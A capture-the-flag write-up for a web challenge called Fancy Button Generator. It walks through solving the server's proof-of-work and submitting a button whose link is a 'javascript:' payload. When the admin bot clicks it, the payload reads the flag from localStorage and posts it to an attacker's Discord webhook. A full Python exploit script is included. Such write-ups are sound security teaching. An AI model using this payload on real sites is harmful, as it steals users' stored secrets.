# FANCY_BUTTON_GENERATOR

## Challenge generals information
CTF website: https://ctf.rars.win/ \
Challenge page: https://ctf.rars.win/campaign/web/fancy-button-generator
Linked files:
    - A directory containing the entire code
    - a link to the hosted code (https://fbg.rars.win/).

## I - Understand the code

The code is divided in two parts: 
 - The admin code, a node.js code,
 - The server code, a Flask (python) code.

By reading the server code, we can understand that it's the one loading the page at https://fbg.rars.win/.
We can also see that this code offer a possibility to share our generated button with an admin.
Doing this, the server send a request to "/xss/add", which is a route managed by the admin node.js code. 
This allows us to think that the admin code is the one that will receive and evaluate our button.

By reading the admin code, we can see that the flag (because it's the name of the variable) is located inside env 
variable, and is stored inside the localStorage of the page created to click on our button. This allows us to see the 
path to this flag:
 - Send a button to be the server, and being accepted to be able to send it to the admin,
 - Send admin specific information that allow him to send us the flag while it is testing our button.

## II - Be accepted by the server

By looking inside server.py code, we can see that we need to send a request to /pow if we want to be verified 
(`session['verified'] = True`). For this, we need to send him the solution of a test, using two parameters.
First, we should send a get request to the server/pow to get these parameters, use the functions given inside pow.py 
in order to find the solution, and send the solution in post to the server to be verified for 30 seconds.

To do this, we simply need to run this python code :
```python
import requests
from pow_fun import solve

host = "https://fbg.rars.win/"
s = requests.Session()
data = s.get(host + "pow").json()
solution = solve(data['pref'], data['suff'], 5)
s.post(host + "pow", json={"answer": solution})
```

## III - Send our button 
While testing the button, the admin will click on it. This action will open a new page with it's own empty local 
storages, so send the admin to a page with a JS code I typed myself didn't work.
We can also put a link that don't send the admin to another page, but make him run a JS code locally on the same page
(with the flag in the localStorage) by sending a link like : `javascript: <my_js_code>`. Then, while testing the button, 
the admin will run our javascript code.
For this code, I choosed to make him send me the flag on a discord webhook:
```javascript
fetch(
    'https://discord.com/api/webhooks/link/to/my/webhook',
    {
        'method':'POST',
        'headers':
            {
                'content-type':'application/json'
            },
        'body': JSON.stringify( 
            {
                'content': localStorage.flag  // AKA 'content': 'message to send'
            })
    });
```

that give us a link like:
```python
link = "javascript:fetch('https://discord.com/api/webhooks/link/to/my/webhook',{'method':'POST','headers':{'content-type':'application/json'},'body': JSON.stringify({'content': localStorage.flag})});";
```

And so send this link to the admin will make him send the flag to us my discord message.

So finally, executing the following python code: 
```python
import requests
from pow_fun import solve

# For server registration
host = "https://fbg.rars.win/"
s = requests.Session()
data = s.get(host + "pow").json()
solution = solve(data['pref'], data['suff'], 5)
s.post(host + "pow", json={"answer": solution})

# For admin
button_title = "give me flag plz"
link = "javascript:fetch('https://discord.com/api/webhooks/link/to/my/webhook',{'method':'POST','headers':{'content-type':'application/json'},'body': JSON.stringify({'content': localStorage.flag})});";
r = s.get(host + "admin", params={"title": button_title, "link": link})
```

Will give us the flag:\
![flag](https://drive.google.com/uc?export=view&id=1imPbgRPgoEj6q5LluehxqRDZcaDQfj5L)
